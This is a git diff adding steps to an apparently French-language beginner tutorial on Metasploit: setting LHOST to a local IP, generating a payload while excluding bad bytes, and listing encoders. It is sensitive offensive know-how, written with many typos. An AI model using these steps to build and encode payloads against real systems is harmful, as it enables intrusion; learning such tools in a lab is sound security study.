@@ -127,3 +127,27 @@ critquez pas svp -__-
 
 <img width="1917" height="1017" alt="image" src="https://github.com/user-attachments/assets/fc0183fb-80c6-4374-baaa-ba72bf103ed8" />
 
+## ensuite :
+
+### taper cette commande pour presiser cotre adresse ip (remplacer mon ip par la votre )
+
+````bash$
+set Lhost 192.168.56.101
+````
+## puis :
+### taper cette commande pour avoir les commande et parametre possible a mettre sur votre platload :
+
+````bash
+generate -h
+````
+## puis on va generer le playload :
+
+````bash
+generate -b \x00\xff
+````
+## puis on va encoder le playload :
+
+````bash
+generate -h
+show encoders
+````
